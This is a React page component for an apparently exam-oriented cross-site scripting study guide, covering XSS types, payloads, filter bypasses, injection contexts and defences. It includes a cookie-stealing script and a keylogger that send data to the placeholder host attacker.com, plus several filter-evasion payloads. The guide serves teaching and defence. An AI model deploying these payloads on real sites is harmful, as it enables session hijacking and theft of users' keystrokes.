import { Callout, Table, SectionHeading, SubHeading, T, CodeBlock } from "@/components/ContentComponents";

export default function XssContent() {
  return (
    <div className="space-y-1 text-slate-700 leading-relaxed">

      <SectionHeading id="what-is-xss">What is XSS?</SectionHeading>
      <p>
        <strong>Cross-Site Scripting (XSS)</strong> is a client-side injection vulnerability where an attacker injects malicious scripts into web pages viewed by other users. The victim&apos;s browser executes the script in the context of the vulnerable website — giving the attacker the same privileges as that origin.
      </p>
      <Callout type="key">
        XSS is a <em>client-side</em> vulnerability. The server is the delivery mechanism; the browser is the execution environment. This is why the Same-Origin Policy matters.
      </Callout>
      <p className="text-sm">
        XSS is consistently in the OWASP Top 10. It can lead to session hijacking, credential theft, keylogging, defacement, or full account takeover.
      </p>

      <SectionHeading id="xss-types">Types of XSS</SectionHeading>

      <SubHeading>Reflected XSS (Non-Persistent)</SubHeading>
      <p className="text-sm">
        The payload is embedded in a URL or form input, sent to the server, and immediately echoed back in the HTTP response. The victim must click a crafted link.
      </p>
      <CodeBlock lang="Example URL">
        {`https://victim.com/search?q=<script>alert(document.cookie)</script>`}
      </CodeBlock>
      <p className="text-sm">The server renders: <T>{`You searched for: <script>alert(document.cookie)</script>`}</T> — script executes.</p>

      <SubHeading>Stored XSS (Persistent)</SubHeading>
      <p className="text-sm">
        The payload is stored in a database (e.g., a comment, profile field, forum post) and served to every user who views that content. No crafted link needed — every visitor is a victim.
      </p>
      <Callout type="danger">
        Stored XSS is the most dangerous variant. A single injection can affect every user of the application indefinitely.
      </Callout>

      <SubHeading>DOM-Based XSS</SubHeading>
      <p className="text-sm">
        The payload is processed entirely client-side by JavaScript. The server never sees the malicious input. It exploits insecure use of DOM APIs like <T>document.write()</T>, <T>innerHTML</T>, <T>location.hash</T>.
      </p>
      <CodeBlock lang="Vulnerable JavaScript">
        {`// Dangerous — directly injects URL fragment into page
document.getElementById("output").innerHTML = location.hash.slice(1);
// Attack URL: https://victim.com/page#<img src=x onerror=alert(1)>`}
      </CodeBlock>

      <Table
        headers={["Type", "Delivery", "Persistence", "Victim Action"]}
        rows={[
          ["Reflected", "URL / form input echoed by server", "None", "Must click crafted link"],
          ["Stored", "Injected payload saved in DB", "Yes — survives server restart", "Visit any infected page"],
          ["DOM-Based", "Client-side JS processes URL/DOM", "None", "Must visit crafted URL"],
        ]}
      />

      <SectionHeading id="xss-payloads">Common Payloads</SectionHeading>

      <SubHeading>Basic Alert (PoC)</SubHeading>
      <CodeBlock lang="HTML">
        {`<script>alert(1)</script>
<script>alert(document.domain)</script>`}
      </CodeBlock>

      <SubHeading>Cookie Theft</SubHeading>
      <CodeBlock lang="JavaScript">
        {`<script>
  new Image().src = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie);
</script>`}
      </CodeBlock>
      <p className="text-sm mt-2">
        The attacker runs a server that logs GET requests. The victim&apos;s cookies arrive as query parameters.
      </p>
      <Callout type="info">
        <T>HttpOnly</T> cookies cannot be read by JavaScript (<T>document.cookie</T> won&apos;t return them), but the session is still potentially vulnerable to CSRF if not otherwise protected.
      </Callout>

      <SubHeading>Event Handler Payloads (No &lt;script&gt; tag)</SubHeading>
      <CodeBlock lang="HTML">
        {`<img src=x onerror="alert(1)">
<body onload="alert(1)">
<svg onload="alert(1)">
<input autofocus onfocus="alert(1)">
<a href="javascript:alert(1)">Click me</a>`}
      </CodeBlock>

      <SubHeading>Keylogger</SubHeading>
      <CodeBlock lang="JavaScript">
        {`<script>
  document.addEventListener("keypress", function(e) {
    fetch("https://attacker.com/log?k=" + e.key);
  });
</script>`}
      </CodeBlock>

      <SectionHeading id="xss-bypass">Filter Bypass Techniques</SectionHeading>
      <p className="text-sm">Filters typically block certain keywords or tags. Techniques to bypass them:</p>

      <SubHeading>Case Variation</SubHeading>
      <CodeBlock>{`<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>`}</CodeBlock>

      <SubHeading>HTML Entity Encoding</SubHeading>
      <CodeBlock>{`<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<!-- &#97; = 'a', &#108; = 'l', etc. — browser decodes before executing -->`}</CodeBlock>

      <SubHeading>URL Encoding</SubHeading>
      <CodeBlock>{`<a href="javascript:%61lert(1)">Click</a>
<!-- %61 = 'a' -->`}</CodeBlock>

      <SubHeading>Double Encoding</SubHeading>
      <CodeBlock>{`%253Cscript%253E  →  %3Cscript%3E  →  <script>`}</CodeBlock>

      <SubHeading>Unicode / Hex Encoding</SubHeading>
      <CodeBlock lang="JavaScript">{`<script>alert(1)</script>
<script>\x61lert(1)</script>`}</CodeBlock>

      <SubHeading>Breaking up Keywords</SubHeading>
      <CodeBlock lang="HTML">{`<scr<script>ipt>alert(1)</scr</script>ipt>
<!-- If filter strips <script>, the result is a valid <script> tag -->`}</CodeBlock>

      <SubHeading>Null Bytes</SubHeading>
      <CodeBlock>{`<scri%00pt>alert(1)</scri%00pt>`}</CodeBlock>

      <Callout type="tip">
        In an exam: if <T>&lt;script&gt;</T> is filtered, try event handlers (<T>onerror</T>, <T>onload</T>, <T>onfocus</T>). If attributes are sanitised, try a different tag. Always check the encoding context first.
      </Callout>

      <SectionHeading id="xss-context">Injection Contexts</SectionHeading>
      <p className="text-sm">Where your input lands determines which payload to use:</p>

      <Table
        headers={["Context", "Example", "Payload Strategy"]}
        rows={[
          ["HTML content", `<p>USER_INPUT</p>`, `<script>...</script> or event handlers`],
          ["HTML attribute (unquoted)", `<div class=USER_INPUT>`, `close attr + inject: x onmouseover=alert(1)`],
          ["HTML attribute (quoted)", `<div class="USER_INPUT">`, `break quote: " onmouseover="alert(1)`],
          ["JavaScript variable", `var x = "USER_INPUT";`, `close string: "; alert(1); //`],
          ["URL href", `<a href="USER_INPUT">`, `javascript:alert(1)`],
          ["CSS", `style="color: USER_INPUT"`, `expression(alert(1)) (IE only)`],
        ]}
      />

      <SectionHeading id="xss-mitigation">Mitigations</SectionHeading>

      <SubHeading>Output Encoding (Primary Defence)</SubHeading>
      <p className="text-sm">
        Encode user-controlled data before inserting it into HTML. Use context-appropriate encoding:
      </p>
      <Table
        headers={["Context", "Encoding"]}
        rows={[
          ["HTML body", "HTML entity encode: & → &amp; < → &lt; > → &gt;"],
          ["HTML attribute", "Attribute encode, always quote attributes"],
          ["JavaScript", "Unicode escape: \\uXXXX"],
          ["URL", "URL percent-encode"],
          ["CSS", "CSS escape: \\XXXXXX"],
        ]}
      />
      <p className="text-sm mt-2">
        Use established libraries: DOMPurify (client-side), OWASP Java Encoder, Microsoft AntiXSS.
      </p>

      <SubHeading>Content Security Policy (CSP)</SubHeading>
      <p className="text-sm">
        HTTP header that tells the browser which sources are trusted for scripts. Blocks inline scripts and restricts external sources.
      </p>
      <CodeBlock lang="HTTP Header">
        {`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'`}
      </CodeBlock>
      <Callout type="warning">
        CSP is a <em>defence-in-depth</em> measure, not a substitute for output encoding. A misconfigured CSP (e.g. allowing <T>unsafe-inline</T>) provides no protection.
      </Callout>

      <SubHeading>HttpOnly Cookie Flag</SubHeading>
      <p className="text-sm">
        Setting <T>HttpOnly</T> on session cookies prevents JavaScript from reading them via <T>document.cookie</T>. This stops the most common cookie-theft XSS attack.
      </p>

      <SubHeading>Input Validation</SubHeading>
      <p className="text-sm">
        Validate that input matches expected format (allowlist, not blocklist). Reject or sanitise unexpected characters. Do not rely on this alone — always output-encode as well.
      </p>

      <Callout type="tip">
        Defence order: (1) Output encode everything by default. (2) Use CSP as defence-in-depth. (3) Set HttpOnly on session cookies. (4) Validate input format at boundaries. Input sanitisation alone is not sufficient.
      </Callout>

    </div>
  );
}
